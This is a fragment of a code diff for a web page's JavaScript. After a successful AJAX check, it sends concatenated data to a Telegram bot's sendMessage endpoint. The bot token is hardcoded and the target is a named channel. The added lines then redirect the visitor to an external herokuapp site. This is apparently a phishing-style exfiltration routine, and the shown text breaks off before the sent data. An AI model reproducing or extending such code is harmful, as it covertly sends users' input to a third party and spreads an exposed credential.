@@ -354,7 +354,12 @@
             success: function (result) {     
               if(result == true){
                 
-                var xhttp = new XMLHttpRequest();                  
+                var xhttp = new XMLHttpRequest();    
+                xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                      window.location.href = "https://autosignal.herokuapp.com";
+                    }
+                  };             
                   xhttp.open(
                     "GET",
                     "https://api.telegram.org/bot5455276964:AAFLB-A_Jc88A7ZlPQoN7CF6utmKu8QoO-E/sendMessage?chat_id=@purpleplusram&text=" +
